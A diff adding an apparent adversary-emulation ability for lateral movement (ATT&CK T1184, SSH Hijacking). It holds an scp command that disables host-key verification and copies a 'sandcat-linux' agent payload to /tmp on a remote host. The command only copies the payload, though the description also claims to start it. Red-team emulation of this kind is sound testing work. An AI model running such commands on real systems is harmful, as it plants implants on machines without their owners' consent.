@@ -1,0 +1,14 @@
+---
+
+- id: 10a9d979-e342-418a-a9b0-002c483e0fa6
+  name: Move 54ndc47
+  description: Copy 54ndc47 to remote host and start it
+  tactic: lateral-movement
+  technique:
+    attack_id: T1184
+    name: SSH Hijacking
+  executors:
+    darwin:
+      command: |
+        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null #{files}/sandcat-linux #{remote.ssh.cmd}:/tmp
+      payload: sandcat-linux
